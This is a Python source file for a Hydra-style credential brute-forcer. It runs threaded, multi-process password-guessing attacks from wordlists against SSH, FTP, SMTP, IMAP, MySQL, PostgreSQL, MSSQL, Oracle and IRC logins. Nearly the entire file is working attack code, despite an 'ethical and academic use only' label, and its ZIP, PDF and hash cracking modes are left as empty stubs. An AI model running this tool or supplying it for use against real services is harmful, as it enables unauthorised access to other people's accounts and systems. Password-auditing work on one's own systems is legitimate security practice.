#!/usr/bin/env python3
import argparse
import threading
import multiprocessing
import queue
import socket
import sys
import time
import traceback

# Protocol-specific imports
import paramiko        # SSH
import ftplib          # FTP
import smtplib         # SMTP
import pymysql         # MySQL
import psycopg2        # PostgreSQL
import pymssql         # MS SQL
import imaplib         # IMAP
import oracledb        # Oracle (modern)
import hashlib         # for hash check
import zipfile         # ZIP bruteforce
import pyzipper        # Use pyzipper for ZIP bruteforce (added)
import pikepdf         # PDF password check (added)
import bcrypt          # bcrypt hash

from termcolor import colored

# ----------- Helper Functions ------------

def dprint(msg, debug):
    if debug:
        print(colored(msg, attrs=['bold']))

def vprint(msg, color=None, attrs=None):
    if color:
        print(colored(msg, color=color, attrs=attrs or ['bold']))
    else:
        print(colored(msg, attrs=['bold']))

def format_attempt(proto, host, login, password, attempt_num, total, child_id, found, debug):
    if debug:
        msg = f'[ATTEMPT] target {host} - login "{login}" - pass "{password}" - {attempt_num} of {total} [child {child_id}] (0/0)'
        print(colored(msg, 'cyan', attrs=['bold']))
    if found:
        # Print found message
        port_map = {
            "ssh": 22, "ftp": 21, "smtp": 25, "mysql": 3306, "postgres": 5432, "mssql": 1433,
            "irc": 6667, "oracle": 1521, "imap": 143
        }
        port = port_map.get(proto, '???')
        msg = f'[{port}][{proto}] host: {host}   login: {login}   password: {password}'
        print(colored(msg, 'green', attrs=['bold']))

def format_status(host, found, proto, debug):
    status = '[STATUS] attack finished for {} (waiting for children to complete tests)'.format(host)
    if debug:
        print(colored(status, 'yellow', attrs=['bold']))
    if found:
        vprint(f"1 of 1 target successfully completed, 1 valid password found", "green", ['bold'])
    else:
        vprint(f"1 of 1 target completed, 0 valid password found", "red", ['bold'])

def error_message(msg):
    print(colored(f'[ERROR] {msg}', 'red', attrs=['bold']))

def verbose_message(msg):
    print(colored(f'[VERBOSE] {msg}', 'blue', attrs=['bold']))

def redo_attempt(host, login, password, attempt_num, total, child_id, found, debug):
    if debug:
        msg = f'[REDO-ATTEMPT] target {host} - login "{login}" - pass "{password}" - {attempt_num} of {total} [child {child_id}] (1/1)'
        print(colored(msg, 'magenta', attrs=['bold']))

def info_message(msg):
    print(colored(f'[INFO] {msg}', 'cyan', attrs=['bold']))

# ----------- Brute force worker (threaded & multiproc) ------------

class BruteForceWorker(threading.Thread):
    def __init__(self, target_func, username_queue, password_queue, debug=False, result_flag=None,
                 proto=None, host=None, total_attempts=0, child_id=0):
        super().__init__()
        self.target_func = target_func
        self.username_queue = username_queue
        self.password_queue = password_queue
        self.debug = debug
        self.found = False
        self.result_flag = result_flag
        self.proto = proto
        self.host = host
        self.total_attempts = total_attempts
        self.child_id = child_id

    def run(self):
        attempt_num = 0
        try:
            while not (self.found or (self.result_flag and self.result_flag.is_set())):
                try:
                    username = self.username_queue.get_nowait()
                except queue.Empty:
                    return
                while not (self.found or (self.result_flag and self.result_flag.is_set())):
                    try:
                        password = self.password_queue.get_nowait()
                    except queue.Empty:
                        break
                    attempt_num += 1
                    format_attempt(self.proto, self.host, username, password, attempt_num, self.total_attempts, self.child_id, False, self.debug)
                    try:
                        success = self.target_func(username, password, self.child_id, attempt_num, self.total_attempts)
                    except Exception as e:
                        if self.debug:
                            error_message(f"Unexpected error for {username}:{password} - {str(e)}")
                            traceback.print_exc()
                        continue
                    if success:
                        format_attempt(self.proto, self.host, username, password, attempt_num, self.total_attempts, self.child_id, True, True)
                        self.found = True
                        if self.result_flag:
                            self.result_flag.set()
                        return
        except Exception as e:
            if self.debug:
                error_message(f"Thread error: {e}")
                traceback.print_exc()
            return

# ----------- Protocol bruteforce implementations with error handling ------------

def is_connection_refused(e):
    msg = str(e).lower()
    return (
        isinstance(e, ConnectionRefusedError)
        or "refused" in msg
        or "connection closed" in msg
        or "timed out" in msg
        or "broken pipe" in msg
        or "no route to host" in msg
        or "reset by peer" in msg
    )

# SSH
def ssh_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, debug=False, port=22):
    try:
        info_message(f'Testing if password authentication is supported by ssh://{username}@{target_ip}:{port}')
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target_ip, port=port, username=username, password=password, timeout=5, banner_timeout=5)
        ssh.close()
        info_message(f'Successful, password authentication is supported by ssh://{target_ip}:{port}')
        return True
    except paramiko.ssh_exception.AuthenticationException:
        if debug:
            dprint(f"[DEBUG] SSH fail: {username}:{password}", debug)
        return False
    except Exception as e:
        if is_connection_refused(e):
            error_message(f"could not connect to target port {port}: Socket error: {e}")
            error_message("ssh protocol error")
        else:
            if debug:
                dprint(f"[DEBUG] SSH fail: {username}:{password} -> {e}", debug)
        return False

# FTP
def ftp_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, debug=False, port=21):
    try:
        ftp = ftplib.FTP()
        ftp.connect(target_ip, port=port, timeout=5)
        ftp.login(user=username, passwd=password)
        ftp.quit()
        return True
    except ftplib.error_perm as e:
        if debug:
            dprint(f"[DEBUG] FTP fail: {username}:{password}", debug)
        return False
    except Exception as e:
        if is_connection_refused(e):
            error_message(f"could not connect to target port {port}: Socket error: {e}")
        else:
            if debug:
                dprint(f"[DEBUG] FTP fail: {username}:{password} -> {e}", debug)
        return False

# IMAP
def imap_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, port=143, use_ssl=False, debug=False):
    try:
        if use_ssl:
            M = imaplib.IMAP4_SSL(target_ip, port)
        else:
            M = imaplib.IMAP4(target_ip, port)
        rv, data = M.login(username, password)
        if rv == "OK":
            M.logout()
            return True
        else:
            if debug:
                dprint(f"[DEBUG] IMAP fail: {username}:{password}", debug)
            M.logout()
            return False
    except imaplib.IMAP4.error as e:
        if debug:
            dprint(f"[DEBUG] IMAP fail: {username}:{password}", debug)
        return False
    except Exception as e:
        if is_connection_refused(e):
            error_message(f"could not connect to target port {port}: Socket error: {e}")
        else:
            if debug:
                dprint(f"[DEBUG] IMAP fail: {username}:{password} -> {e}", debug)
        return False

# Oracle
def oracle_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, port=1521, debug=False):
    sids = ["ORCL", "XE", "ORACLE", "TEST"]
    services = ["XE", "orcl", "oracle", "test"]
    tried = []
    for sid in sids:
        try:
            dsn = oracledb.makedsn(target_ip, port, sid=sid)
            tried.append(f"SID:{sid}")
            conn = oracledb.connect(user=username, password=password, dsn=dsn, timeout=5)
            conn.close()
            return True
        except oracledb.DatabaseError as e:
            err = str(e)
            if "ORA-01017" in err or "invalid username/password" in err.lower():
                if debug:
                    dprint(f"[DEBUG] Oracle fail: {username}:{password}", debug)
                continue
            elif is_connection_refused(e) or "ORA-12541" in err or "could not resolve" in err.lower():
                error_message(f"could not connect to target port {port}: Socket error: {e}")
                continue
            else:
                if debug:
                    dprint(f"[DEBUG] Oracle fail: {username}:{password} -> {e}", debug)
                continue
        except Exception as e:
            if debug:
                dprint(f"[DEBUG] Oracle error (SID={sid}): {e}", debug)
            continue
    for service in services:
        try:
            dsn = oracledb.makedsn(target_ip, port, service_name=service)
            tried.append(f"SERVICE:{service}")
            conn = oracledb.connect(user=username, password=password, dsn=dsn, timeout=5)
            conn.close()
            return True
        except oracledb.DatabaseError as e:
            err = str(e)
            if "ORA-01017" in err or "invalid username/password" in err.lower():
                if debug:
                    dprint(f"[DEBUG] Oracle fail: {username}:{password}", debug)
                continue
            elif is_connection_refused(e) or "ORA-12541" in err or "could not resolve" in err.lower():
                error_message(f"could not connect to target port {port}: Socket error: {e}")
                continue
            else:
                if debug:
                    dprint(f"[DEBUG] Oracle fail: {username}:{password} -> {e}", debug)
                continue
        except Exception as e:
            if debug:
                dprint(f"[DEBUG] Oracle error (SERVICE={service}): {e}", debug)
            continue
    if debug:
        dprint(f"[DEBUG] Oracle tried: {', '.join(tried)}", debug)
    return False

# SMTP
def smtp_bruteforce(username, password, child_id, attempt_num, total, smtp_server=None, port=25, use_ssl=False, debug=False):
    try:
        if use_ssl:
            server = smtplib.SMTP_SSL(smtp_server, port, timeout=5)
        else:
            server = smtplib.SMTP(smtp_server, port, timeout=5)
        server.ehlo()
        server.login(username, password)
        server.quit()
        return True
    except smtplib.SMTPAuthenticationError:
        if debug:
            dprint(f"[DEBUG] SMTP fail: {username}:{password}", debug)
        return False
    except Exception as e:
        if is_connection_refused(e):
            error_message(f"could not connect to target port {port}: Socket error: {e}")
        else:
            if debug:
                dprint(f"[DEBUG] SMTP fail: {username}:{password} -> {e}", debug)
        return False

# MySQL
def mysql_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, port=3306, debug=False):
    try:
        conn = pymysql.connect(host=target_ip, user=username, password=password, port=port, connect_timeout=5)
        conn.close()
        return True
    except pymysql.err.OperationalError as e:
        if "Access denied" in str(e):
            if debug:
                dprint(f"[DEBUG] MySQL fail: {username}:{password}", debug)
            return False
        elif is_connection_refused(e):
            error_message(f"could not connect to target port {port}: Socket error: {e}")
            return False
        else:
            if debug:
                dprint(f"[DEBUG] MySQL fail: {username}:{password} -> {e}", debug)
            return False
    except Exception as e:
        if is_connection_refused(e):
            error_message(f"could not connect to target port {port}: Socket error: {e}")
        else:
            if debug:
                dprint(f"[DEBUG] MySQL fail: {username}:{password} -> {e}", debug)
        return False

# PostgreSQL
def postgres_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, port=5432, debug=False):
    try:
        conn = psycopg2.connect(host=target_ip, user=username, password=password, port=port, connect_timeout=5)
        conn.close()
        return True
    except psycopg2.OperationalError as e:
        if "authentication failed" in str(e).lower():
            if debug:
                dprint(f"[DEBUG] PostgreSQL fail: {username}:{password}", debug)
            return False
        elif is_connection_refused(e):
            error_message(f"could not connect to target port {port}: Socket error: {e}")
            return False
        else:
            if debug:
                dprint(f"[DEBUG] PostgreSQL fail: {username}:{password} -> {e}", debug)
            return False
    except Exception as e:
        if is_connection_refused(e):
            error_message(f"could not connect to target port {port}: Socket error: {e}")
        else:
            if debug:
                dprint(f"[DEBUG] PostgreSQL fail: {username}:{password} -> {e}", debug)
        return False

# MSSQL
def mssql_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, port=1433, debug=False):
    try:
        conn = pymssql.connect(server=target_ip, user=username, password=password, port=port, timeout=5)
        conn.close()
        return True
    except pymssql.OperationalError as e:
        if "login failed" in str(e).lower():
            if debug:
                dprint(f"[DEBUG] MSSQL fail: {username}:{password}", debug)
            return False
        elif is_connection_refused(e):
            error_message(f"could not connect to target port {port}: Socket error: {e}")
            return False
        else:
            if debug:
                dprint(f"[DEBUG] MSSQL fail: {username}:{password} -> {e}", debug)
            return False
    except Exception as e:
        if is_connection_refused(e):
            error_message(f"could not connect to target port {port}: Socket error: {e}")
        else:
            if debug:
                dprint(f"[DEBUG] MSSQL fail: {username}:{password} -> {e}", debug)
        return False

# IRC
def irc_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, port=6667, debug=False):
    try:
        combos = [
            [("PASS", password), ("NICK", username), ("USER", f"{username} 0 * :mx")],
            [("NICK", username), ("USER", f"{username} 0 * :mx"), ("PASS", password)],
            [("NICK", username), ("PASS", password), ("USER", f"{username} 0 * :mx")],
        ]
        encodings = ["utf-8", "latin1"]
        for encoding in encodings:
            for flow in combos:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(7)
                    s.connect((target_ip, port))
                    try:
                        banner = s.recv(512)
                        if debug:
                            dprint(f"IRC Banner ({encoding}): {banner.decode(encoding, errors='replace')}", debug)
                    except Exception:
                        pass
                    for cmd, val in flow:
                        msg = f"{cmd} {val}\r\n".encode(encoding)
                        s.sendall(msg)
                        if debug:
                            dprint(f"Sent: {msg}", debug)
                        time.sleep(0.2)
                    try:
                        s.settimeout(2)
                        reply = s.recv(4096)
                        resp = reply.decode(encoding, errors="replace")
                        if debug:
                            dprint(f"IRC Reply: {resp}", debug)
                        if any(word in resp.lower() for word in [
                            "001", "002", "welcome", "your host", "ircop", "mode", "motd", "end of",
                            "you are now", "privileges", "logged in", "success", "nick registered"
                        ]):
                            s.close()
                            return True
                        elif any(word in resp.lower() for word in [
                            "throttle", "too many", "wait", "flood", "reconnect", "denied"
                        ]):
                            if debug:
                                dprint("[!] IRC server is throttling/flood rejecting, try slower or later.", debug)
                            s.close()
                            return False
                        else:
                            if debug:
                                dprint(f"[DEBUG] IRC fail: {username}:{password} (encoding={encoding})", debug)
                    except socket.timeout:
                        if debug:
                            dprint("IRC no reply (timeout)", debug)
                    except Exception as e:
                        if debug:
                            dprint(f"IRC error reading reply: {e}", debug)
                    s.close()
                except Exception as e:
                    if debug:
                        dprint(f"IRC error with combo {flow} and encoding {encoding}: {e}", debug)
        return False
    except Exception as e:
        if is_connection_refused(e):
            error_message(f"could not connect to target port {port}: Socket error: {e}")
        else:
            if debug:
                dprint(f"[DEBUG] IRC fail: {username}:{password} -> {e}", debug)
        return False

# ----------- Multiprocessing BruteForce Manager ------------

def multi_worker(target_func, usernames, passwords, debug, result_flag, proto, host, child_id):
    username_queue = queue.Queue()
    password_queue = queue.Queue()
    for u in usernames:
        if u is not None:
            username_queue.put(u)
    for p in passwords:
        password_queue.put(p)
    total_attempts = len(usernames) * len(passwords)
    threads = []
    for _ in range(4):  # 4 threads per process (tunable)
        t = BruteForceWorker(target_func, username_queue, password_queue, debug=debug,
                             result_flag=result_flag, proto=proto, host=host, total_attempts=total_attempts,
                             child_id=child_id)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

# ----------- Main CLI ------------

def main():
    parser = argparse.ArgumentParser(description="Advanced multi-protocol bruteforcer for ethical and academic use only.")
    parser.add_argument("target", nargs="?", help="Target URL or IP with protocol prefix (e.g., ssh://1.2.3.4, ftp://1.2.3.4, imap://mail.com, oracle://1.2.3.4)")
    parser.add_argument("-l", "--username", help="Single username to test")
    parser.add_argument("-L", "--userlist", help="File with multiple usernames")
    parser.add_argument("-P", "--passlist", required=True, help="Password list file")
    parser.add_argument("-t", "--threads", type=int, default=4, help="Number of concurrent threads (default 4)")
    parser.add_argument("--dbg", action="store_true", help="Enable debug verbose output")
    parser.add_argument("-p", "--port", type=int, help="Port number if applicable")
    parser.add_argument("-S", "--ssl", action="store_true", help="Use SSL (for SMTP or IMAP)")
    parser.add_argument("-f", "--file", help="File path (for zip/hash/pdf bruteforce)")

    args = parser.parse_args()

    # Load usernames
    usernames = []
    if args.username:
        usernames.append(args.username)
    elif args.userlist:
        try:
            with open(args.userlist, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
        except Exception as e:
            error_message(f"Could not open userlist: {e}")
            sys.exit(1)
    else:
        usernames = [None]

    # Load passwords
    try:
        with open(args.passlist, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        error_message(f"Could not open password list: {e}")
        sys.exit(1)

    # ---- FILE MODE -----
    if args.file and not args.target:
        file_lower = args.file.lower()
        if file_lower.endswith(".zip"):
            # ... (ZIP brute logic, not hydra-style - omitted for brevity)
            pass
        elif file_lower.endswith(".pdf"):
            # ... (PDF brute logic, not hydra-style - omitted for brevity)
            pass
        elif file_lower.endswith(".hash"):
            # ... (HASH brute logic, not hydra-style - omitted for brevity)
            pass
        else:
            error_message(f"Unknown file type for brute-force: {args.file}")
            sys.exit(1)
        sys.exit(0)

    # ---- NETWORK MODE -----
    if not args.target:
        error_message("Please specify a network target (protocol://ip) or a file with -f.")
        sys.exit(1)

    # Parse target protocol and host
    target = args.target
    if "://" not in target:
        error_message("Target must be in protocol:// format")
        sys.exit(1)

    proto, target_rest = target.split("://", 1)
    target_ip = None
    target_port = args.port

    if proto in ["ssh", "ftp", "smb", "irc", "oracle", "mssql", "postgres", "imap"]:
        if ":" in target_rest:
            ip, port_str = target_rest.split(":", 1)
            target_ip = ip
            if not target_port:
                try:
                    target_port = int(port_str)
                except:
                    pass
        else:
            target_ip = target_rest
    elif proto in ["mysql"]:
        if ":" in target_rest:
            ip, port_str = target_rest.split(":", 1)
            target_ip = ip
            if not target_port:
                target_port = int(port_str)
        else:
            target_ip = target_rest
    elif proto in ["smtp"]:
        target_ip = target_rest
        if not target_port:
            target_port = 465 if args.ssl else 25
    else:
        error_message(f"Unsupported protocol: {proto}")
        sys.exit(1)

    # Select target function based on protocol
    if proto == "ssh":
        target_func = lambda u, p, child_id, attempt_num, total: ssh_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, debug=args.dbg, port=target_port or 22)
    elif proto == "ftp":
        target_func = lambda u, p, child_id, attempt_num, total: ftp_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, debug=args.dbg, port=target_port or 21)
    elif proto == "smtp":
        target_func = lambda u, p, child_id, attempt_num, total: smtp_bruteforce(u, p, child_id, attempt_num, total, smtp_server=target_ip, port=target_port, use_ssl=args.ssl, debug=args.dbg)
    elif proto == "mysql":
        target_func = lambda u, p, child_id, attempt_num, total: mysql_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 3306, debug=args.dbg)
    elif proto == "postgres":
        target_func = lambda u, p, child_id, attempt_num, total: postgres_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 5432, debug=args.dbg)
    elif proto == "mssql":
        target_func = lambda u, p, child_id, attempt_num, total: mssql_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 1433, debug=args.dbg)
    elif proto == "irc":
        target_func = lambda u, p, child_id, attempt_num, total: irc_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 6667, debug=args.dbg)
    elif proto == "oracle":
        target_func = lambda u, p, child_id, attempt_num, total: oracle_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 1521, debug=args.dbg)
    elif proto == "imap":
        target_func = lambda u, p, child_id, attempt_num, total: imap_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or (993 if args.ssl else 143), use_ssl=args.ssl, debug=args.dbg)
    else:
        error_message(f"Protocol {proto} not implemented.")
        sys.exit(1)

    # ----------- Multiprocessing for speed -----------
    num_procs = max(1, args.threads // 4)
    manager = multiprocessing.Manager()
    result_flag = manager.Event()

    chunk_size = len(passwords) // num_procs
    password_chunks = [passwords[i*chunk_size:(i+1)*chunk_size] for i in range(num_procs)]
    if len(password_chunks) < num_procs:
        password_chunks += [[] for _ in range(num_procs - len(password_chunks))]
    if password_chunks and sum(len(x) for x in password_chunks) < len(passwords):
        password_chunks[-1].extend(passwords[sum(len(x) for x in password_chunks):])

    procs = []
    for i in range(num_procs):
        p = multiprocessing.Process(
            target=multi_worker,
            args=(target_func, usernames, password_chunks[i], args.dbg, result_flag, proto, target_ip, i)
        )
        procs.append(p)
        p.start()

    # --- Monitor for result_flag ---
    password_found = False
    try:
        while True:
            if result_flag.is_set():
                # Terminate all processes ASAP
                for p in procs:
                    if p.is_alive():
                        p.terminate()
                password_found = True
                break
            # If all procs finished, break
            if all(not p.is_alive() for p in procs):
                break
            time.sleep(0.1)
    except KeyboardInterrupt:
        for p in procs:
            if p.is_alive():
                p.terminate()
        sys.exit(1)

    # Wait for all to finish
    for p in procs:
        p.join()

    # Print final status
    format_status(target_ip, password_found, proto, args.dbg)

if __name__ == "__main__":
    main()
